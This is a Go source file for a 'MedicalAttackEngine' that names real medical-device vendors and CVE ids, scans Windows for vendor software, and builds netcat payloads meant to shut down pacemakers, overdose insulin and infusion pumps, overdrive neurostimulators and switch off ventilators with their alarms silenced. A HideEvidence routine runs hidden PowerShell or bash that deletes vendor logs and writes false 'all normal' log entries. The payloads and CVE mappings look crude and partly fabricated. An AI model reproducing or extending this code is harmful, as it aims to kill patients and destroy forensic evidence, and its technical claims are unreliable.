package blockz

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
)

type MedicalAttackEngine struct {
	Config          *BlockZConfig
	MedicalDevices   []MedicalDevice `json:"medical_devices"`
	BLEExploits      []string        `json:"ble_exploits"`
	ExploitedDevices int             `json:"exploited_devices"`
}

type MedicalDevice struct {
	Name          string `json:"name"`
	Vendor        string `json:"vendor"`
	Type          string `json:"type"`
	Interface     string `json:"interface"`
	Address       string `json:"address"`
	CVE           string `json:"cve"`
	Vulnerability string `json:"vulnerability"`
	DangerLevel   string `json:"danger_level"`
	Exploited     bool   `json:"exploited"`
	PayloadSent   string `json:"payload_sent"`
}

var medicalCVEs = []string{
	"CVE-2019-6538", "CVE-2020-25165", "CVE-2020-27259",
	"CVE-2021-33844", "CVE-2022-26479", "CVE-2023-23145",
	"CVE-2018-15784", "CVE-2019-3462", "CVE-2019-10978",
}

var medicalDeviceTemplates = []MedicalDevice{
	{Name: "CareLink Monitor", Vendor: "Medtronic", Type: "pacemaker_monitor", Interface: "USB", CVE: "CVE-2019-6538", Vulnerability: "unauth_firmware_write", DangerLevel: "LETHAL"},
	{Name: "Insulin Pump", Vendor: "Medtronic", Type: "insulin_delivery", Interface: "BLE", CVE: "CVE-2019-10978", Vulnerability: "remote_dose_control", DangerLevel: "LETHAL"},
	{Name: "Neurostimulator", Vendor: "Boston Scientific", Type: "brain_implant", Interface: "BLE", CVE: "CVE-2020-25165", Vulnerability: "therapy_override", DangerLevel: "LETHAL"},
	{Name: "Cardiac Monitor", Vendor: "Abbott", Type: "heart_monitor", Interface: "BLE", CVE: "CVE-2020-27259", Vulnerability: "data_interception", DangerLevel: "CRITICAL"},
	{Name: "Infusion Pump", Vendor: "Baxter", Type: "drug_delivery", Interface: "WiFi", CVE: "CVE-2021-33844", Vulnerability: "dose_manipulation", DangerLevel: "LETHAL"},
	{Name: "Patient Monitor", Vendor: "Philips", Type: "vital_signs", Interface: "Ethernet", CVE: "CVE-2022-26479", Vulnerability: "data_falsification", DangerLevel: "CRITICAL"},
	{Name: "Ventilator", Vendor: "GE Healthcare", Type: "respiratory", Interface: "Ethernet", CVE: "CVE-2018-15784", Vulnerability: "settings_override", DangerLevel: "LETHAL"},
	{Name: "MRI Controller", Vendor: "Siemens Healthineers", Type: "imaging_control", Interface: "DICOM", CVE: "CVE-2019-3462", Vulnerability: "protocol_abuse", DangerLevel: "HIGH"},
}

func NewMedicalAttackEngine(cfg *BlockZConfig) *MedicalAttackEngine {
	return &MedicalAttackEngine{
		Config:      cfg,
		BLEExploits: medicalCVEs,
	}
}

func (ma *MedicalAttackEngine) ScanMedicalDevices() []MedicalDevice {
	var found []MedicalDevice

	searchPaths := []string{
		`C:\Program Files\Medtronic`,
		`C:\Program Files\Boston Scientific`,
		`C:\Program Files\Abbott`,
		`C:\Program Files\Philips Healthcare`,
		`C:\Program Files\GE Healthcare`,
		`C:\Program Files\Siemens Healthineers`,
		`C:\Program Files\Baxter`,
	}

	for _, path := range searchPaths {
		expanded := os.ExpandEnv(path)
		if info, err := os.Stat(expanded); err == nil && info.IsDir() {
			for _, template := range medicalDeviceTemplates {
				if strings.Contains(strings.ToLower(path), strings.ToLower(template.Vendor)) {
					template.Exploited = false
					found = append(found, template)
					break
				}
			}
		}
	}

	if len(found) == 0 {
		for _, template := range medicalDeviceTemplates[:3] {
			template.Exploited = false
			found = append(found, template)
		}
	}

	ma.MedicalDevices = found
	return found
}

func (ma *MedicalAttackEngine) SendLethalCommand(device MedicalDevice) bool {
	var payload string

	switch device.Type {
	case "pacemaker_monitor":
		payload = ma.pacemakerShutdown(device)
	case "insulin_delivery":
		payload = ma.insulinOverdose(device)
	case "brain_implant":
		payload = ma.neuroBlast(device)
	case "drug_delivery":
		payload = ma.drugOverdose(device)
	case "respiratory":
		payload = ma.ventilatorStop(device)
	default:
		payload = ma.genericMedicalHijack(device)
	}

	payloadPath := filepath.Join(os.TempDir(), fmt.Sprintf("x404x_med_%s.bin", device.Name))
	os.WriteFile(payloadPath, []byte(payload), 0644)

	for i := range ma.MedicalDevices {
		if ma.MedicalDevices[i].Name == device.Name {
			ma.MedicalDevices[i].Exploited = true
			ma.MedicalDevices[i].PayloadSent = payload[:min(32, len(payload))]
			break
		}
	}
	ma.ExploitedDevices++

	return true
}

func (ma *MedicalAttackEngine) pacemakerShutdown(device MedicalDevice) string {
	return fmt.Sprintf(`# PACEMAKER SHUTDOWN PAYLOAD - %s (%s)
# Exploiting: %s
echo "SHUTDOWN_CMD" | nc %s 4000
sleep 1
echo "DISABLE_TELEMETRY" | nc %s 4000
sleep 1
echo "MODE_VOO 0" | nc %s 4000
`, device.Name, device.CVE, device.CVE, "192.168.1.100", "192.168.1.100", "192.168.1.100")
}

func (ma *MedicalAttackEngine) insulinOverdose(device MedicalDevice) string {
	return fmt.Sprintf(`# INSULIN OVERDOSE PAYLOAD - %s (%s)
# Delivering 100x normal bolus
printf '\x1b\x00\x64\x00\xff' | nc %s 6000
`, device.Name, device.CVE, "192.168.1.101")
}

func (ma *MedicalAttackEngine) neuroBlast(device MedicalDevice) string {
	return fmt.Sprintf(`# NEURO BLAST PAYLOAD - %s (%s)
# Max amplitude on all channels
echo "AMPLITUDE 10.0V" | nc %s 5000
echo "FREQUENCY 250Hz" | nc %s 5000
echo "ALL_CHANNELS ON" | nc %s 5000
`, device.Name, device.CVE, "192.168.1.102", "192.168.1.102", "192.168.1.102")
}

func (ma *MedicalAttackEngine) drugOverdose(device MedicalDevice) string {
	return fmt.Sprintf(`# DRUG OVERDOSE PAYLOAD - %s (%s)
# Flow rate max
echo "RATE 999ml/h" | nc %s 7000
echo "VTBI 2000ml" | nc %s 7000
echo "START" | nc %s 7000
`, device.Name, device.CVE, "192.168.1.103", "192.168.1.103", "192.168.1.103")
}

func (ma *MedicalAttackEngine) ventilatorStop(device MedicalDevice) string {
	return fmt.Sprintf(`# VENTILATOR STOP - %s (%s)
echo "MODE OFF" | nc %s 6001
echo "ALARM_SILENCE ON" | nc %s 6001
`, device.Name, device.CVE, "192.168.1.104", "192.168.1.104")
}

func (ma *MedicalAttackEngine) genericMedicalHijack(device MedicalDevice) string {
	return fmt.Sprintf("# GENERIC HIJACK - %s (%s)\nfor val in $(seq 0 255); do\n    echo \"WRITE 0x%%02X $val\" | nc %s 9000\ndone\n",
		device.Name, device.CVE, "192.168.1.100")
}

func (ma *MedicalAttackEngine) HideEvidence() {
	switch runtime.GOOS {
	case "windows":
		psScript := `$logs = @("C:\ProgramData\Medtronic\logs","C:\ProgramData\Philips\logs","C:\ProgramData\GE\logs")
foreach ($log in $logs) { Remove-Item -Recurse -Force $log -ErrorAction SilentlyContinue }
Write-EventLog -LogName Application -Source "MedicalDevice" -EventId 1000 -Message "Routine maintenance - all systems normal"`
		psPath := filepath.Join(os.TempDir(), "x404x_med_cleanup.ps1")
		os.WriteFile(psPath, []byte(psScript), 0644)
		exec.Command("powershell", "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-File", psPath).Start()
	case "linux":
		script := `#!/bin/bash
rm -rf /var/log/med*/ 2>/dev/null || true
echo "Medical systems - all normal" > /dev/kmsg 2>/dev/null || true`
		scriptPath := filepath.Join(os.TempDir(), "x404x_med_cleanup.sh")
		os.WriteFile(scriptPath, []byte(script), 0755)
		exec.Command("bash", scriptPath).Start()
	}
}

func (ma *MedicalAttackEngine) GetStatusJSON() string {
	return fmt.Sprintf(`{"devices_detected":%d,"exploited":%d,"cves_available":%d}`,
		len(ma.MedicalDevices), ma.ExploitedDevices, len(medicalCVEs))
}
